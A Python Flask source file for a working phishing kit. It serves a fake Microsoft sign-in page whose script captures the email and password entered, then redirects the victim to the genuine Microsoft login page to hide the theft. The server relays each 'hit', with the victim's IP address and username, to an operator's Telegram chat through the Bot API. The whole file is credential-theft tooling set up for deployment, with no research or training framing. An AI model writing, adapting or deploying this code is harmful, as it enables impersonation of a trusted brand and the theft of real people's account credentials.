
from flask import Flask, request
import requests
import json
import base64
import urllib.parse
import os

app = Flask(__name__)

TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
CHATID = os.environ.get('TELEGRAM_CHAT_ID')

@app.route('/')
def home():
    return '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Microsoft</title>
<style>body{font-family:Segoe UI;background:#f3f2f1;margin:0;padding:50px;text-align:center}
.login{max-width:400px;margin:auto;background:white;padding:40px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.1)}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer}
button:hover{background:#106ebe}
</style></head><body>
<div class="login">
<h2>🔐 Microsoft Sign In</h2>
<form id="form">
<input id="user" placeholder="Email" required>
<input id="pass" type="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div id="load" style="display:none;padding:20px">Verifying...</div>
</div>
<script>
function send(data){fetch("/grab",{method:"POST",body:JSON.stringify(data)})}
window.onload=function(){send({test:"alive"})};
document.getElementById("form").onsubmit=function(e){
e.preventDefault();
var u=document.getElementById("user").value;
var p=document.getElementById("pass").value;
send({user:u,pass:p,test:"creds"});
document.getElementById("form").style.display="none";
document.getElementById("load").style.display="block";
setTimeout(function(){window.location="https://login.microsoftonline.com/?username="+encodeURIComponent(u)},3000)
}
</script></body></html>''', 200, {'Content-Type': 'text/html'}

@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.get_json() or {}
        ip = request.remote_addr
        user = data.get('user', '')
        msg = f"🚨 HIT from {ip}\\n{'User: '+user if user else 'Cookies: '+str(data.get('test'))}"
        
        print(f"DEBUG: {msg}")  # Railway logs
        
        if TOKEN and CHATID:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                         data={'chat_id':CHATID, 'text':msg})
            return "OK", 200
        else:
            return f"NO TELEGRAM CONFIG: TOKEN={bool(TOKEN)}, CHATID={bool(CHATID)}", 500
    except Exception as e:
        return f"ERROR: {str(e)}", 500

if __name__=='__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Server on {port} | Token: {'YES' if TOKEN else 'NO'}")
    app.run(host='0.0.0.0', port=port)
